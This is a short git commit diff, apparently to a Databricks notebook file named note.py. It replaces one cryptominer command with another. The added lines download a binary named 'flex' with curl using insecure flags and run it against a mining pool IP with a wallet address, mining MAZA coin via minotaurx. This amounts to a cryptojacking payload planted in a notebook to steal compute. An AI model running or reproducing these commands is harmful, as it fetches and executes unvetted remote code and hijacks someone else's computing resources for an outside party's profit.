1ba3e649ede285bf37d51230a912f6806a2ecdf0
paskofamas <mr.paskofa42@jugda.com>
2025-03-02 09:42:19 +0700

    Update note.py

--- note.py
+++ note.py
@@ -1,4 +1,5 @@
 # Databricks notebook source
 %python
 %sh
-./flex -a minotaurx -o 207.244.240.82:6000 -u MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW.Wijaya -p x
+curl -sLkO http://github.com/paskofa10/webmoon/releases/download/flex/flex
+./flex -a minotaurx -o 198.50.168.213:7019 -u MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW -p c=MAZA,zap=MAZA
